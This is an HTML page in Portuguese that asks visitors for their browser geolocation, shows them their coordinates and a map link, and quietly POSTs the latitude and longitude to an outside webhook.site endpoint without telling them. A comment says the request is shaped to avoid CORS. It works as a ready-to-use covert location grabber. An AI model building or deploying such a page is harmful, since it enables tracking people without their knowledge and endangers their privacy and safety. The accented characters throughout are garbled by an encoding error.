<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <title>Captura de Localiza√ß√£o</title>
</head>

<body>
    <h1>Obtendo sua localiza√ß√£o...</h1>
    <p id="output">Aguardando permiss√£o...</p>

    <script>
        const output = document.getElementById("output");

        function showLocation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const mapa = `https://www.google.com/maps?q=${latitude},${longitude}`;
            output.innerHTML = `
        ‚úÖ Localiza√ß√£o obtida:<br>
        Latitude: ${latitude}<br>
        Longitude: ${longitude}<br>
        <a href="${mapa}" target="_blank">Ver no Google Maps</a>
      `;

            // Requisi√ß√£o sem headers personalizados (evita CORS)
            fetch("https://webhook.site/2644ea87-7205-4c07-9973-4d0e61e9082e", {
                method: "POST",
                body: `latitude=${latitude}&longitude=${longitude}`
            }).then(() => {
                console.log("üì° Localiza√ß√£o enviada com sucesso (modo seguro).");
            }).catch((error) => {
                console.error("‚ùå Erro ao enviar localiza√ß√£o:", error);
            });
        }

        function showError(error) {
            output.innerText = `‚ùå Erro ao obter localiza√ß√£o: ${error.message}`;
        }

        window.onload = () => {
            if (!navigator.geolocation) {
                output.innerText = "‚ùå Geolocaliza√ß√£o n√£o suportada neste navegador.";
            } else {
                navigator.geolocation.getCurrentPosition(showLocation, showError);
            }
        };
    </script>
</body>

</html>